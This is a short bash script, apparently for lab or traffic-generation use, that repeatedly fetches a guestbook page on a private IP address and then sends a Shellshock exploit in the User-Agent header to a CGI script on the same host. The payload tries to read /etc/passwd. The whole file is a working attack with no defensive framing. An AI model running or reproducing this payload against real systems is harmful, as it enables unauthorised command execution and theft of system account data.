#!/bin/bash


for i in $(eval echo {$1..$2})
do

sleep 3
curl -k https://10.176.147.83/guestbook.html
sleep 4 
 curl -k -A "() { :;}; \/bin\/cat \/etc\/passwd" https://10.176.147.83/cgi-bin/ss


done

